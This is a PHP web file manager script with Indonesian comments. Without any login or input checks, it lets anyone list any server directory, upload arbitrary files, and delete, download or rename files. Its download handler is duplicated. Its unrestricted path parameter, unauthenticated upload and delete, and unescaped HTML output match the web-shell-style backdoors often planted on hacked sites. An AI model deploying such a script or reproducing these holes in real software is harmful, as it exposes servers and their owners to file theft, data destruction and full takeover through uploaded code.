<?php

// Fungsi untuk menghapus file
function delete_file($file) {
    if (file_exists($file)) {
        unlink($file);
        echo 'File berhasil dihapus: ' . $file . '<br>';
    } else {
        echo 'File tidak ditemukan: ' . $file . '<br>';
    }
}

// Fungsi untuk membuat folder
function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo 'Folder berhasil dibuat: ' . $folder_name . '<br>';
    } else {
        echo 'Folder sudah ada: ' . $folder_name . '<br>';
    }
}

// Ambil path dari parameter URL
$dir = $_GET['path'] ?? '.';

// Jika ada form upload file yang disubmit
if (isset($_POST['submit'])) {
    // Ambil informasi file yang diupload
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];

    // Simpan file di direktori yang dituju
    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
}

// Jika ada form membuat folder yang disubmit
if (isset($_POST['create_folder'])) {
    $folder_name = $_POST['folder_name'];
    create_folder($dir . '/' . $folder_name);
}

// Jika ada parameter delete pada URL, hapus file tersebut
if (isset($_GET['delete'])) {
    $file = $dir . '/' . $_GET['delete'];
    delete_file($file);
}

// Jika ada parameter download pada URL, download file tersebut
if (isset($_GET['download'])) {
    $file = $dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    } else {
        echo 'File tidak ditemukan: ' . $file . '<br>';
    }
}

// Tampilkan daftar file dan folder dalam direktori
if ($handle = opendir($dir)) {
    echo '<ul>';
    while (false !== ($file = readdir($handle))) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                echo '<li><a href="?path=' . $dir . '/' . $file . '">' . $file . '</a></li>';
            } else {
                echo '<li>' . $file . ' <a href="?path=' . $dir . '&download=' . urlencode($file) . '">Download</a> <a href="?path=' . $dir . '&delete=' . urlencode($file) . '">Delete</a></li>';
            }
        }
    }
    echo '</ul>';
    closedir($handle);
}

// Form untuk membuat folder
echo '<form method="post">';
echo '<input type="text" name="folder_name">';
echo '<input type="submit" name="create_folder" value="Create Folder">';
echo '</form>';

// Form untuk mengunggah file
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file">';
echo '<input type="submit" name="submit" value="Upload">';
echo '</form>';
// Fungsi untuk mengedit nama file
function rename_file($file, $new_name) {
    $dir = dirname($file);
    $new_file = $dir . '/' . $new_name;
    if (file_exists($file)) {
        if (!file_exists($new_file)) {
            rename($file, $new_file);
            echo 'File berhasil diubah nama menjadi: ' . $new_name . '<br>';
        } else {
            echo 'File dengan nama yang sama sudah ada: ' . $new_name . '<br>';
        }
    } else {
        echo 'File tidak ditemukan: ' . $file . '<br>';
    }
}

// Fungsi untuk mengedit nama folder
function rename_folder($folder, $new_name) {
    $dir = dirname($folder);
    $new_folder = $dir . '/' . $new_name;
    if (file_exists($folder)) {
        if (!file_exists($new_folder)) {
            rename($folder, $new_folder);
            echo 'Folder berhasil diubah nama menjadi: ' . $new_name . '<br>';
        } else {
            echo 'Folder dengan nama yang sama sudah ada: ' . $new_name . '<br>';
        }
    } else {
        echo 'Folder tidak ditemukan: ' . $folder . '<br>';
    }
}

// Jika ada parameter rename_file pada URL, edit nama file tersebut
if (isset($_POST['rename_file'])) {
    $file = $dir . '/' . $_POST['file_name'];
    $new_name = $_POST['new_name'];
    rename_file($file, $new_name);
}

// Jika ada parameter rename_folder pada URL, edit nama folder tersebut
if (isset($_POST['rename_folder'])) {
    $folder = $dir . '/' . $_POST['folder_name'];
    $new_name = $_POST['new_name'];
    rename_folder($folder, $new_name);
}

// Form untuk mengedit nama file
echo '<form method="post">';
echo '<input type="text" name="file_name">';
echo '<input type="text" name="new_name">';
echo '<input type="submit" name="rename_file" value="Rename File">';
echo '</form>';

// Form untuk mengedit nama folder
echo '<form method="post">';
echo '<input type="text" name="folder_name">';
echo '<input type="text" name="new_name">';
echo '<input type="submit" name="rename_folder" value="Rename Folder">';
echo '</form>';


// Tampilkan tombol untuk berpindah ke folder parent
echo '<a href="?path=' . dirname($dir) . '">Up</a>';

// Jika ada parameter download pada URL, download file tersebut
if (isset($_GET['download'])) {
$file = $dir . '/' . $_GET['download'];
if (file_exists($file)) {
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
header('Content-Transfer-Encoding: binary');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
ob_clean();
flush();
readfile($file);
exit;
} else {
echo 'File tidak ditemukan: ' . $file . '<br>';
}
}
?>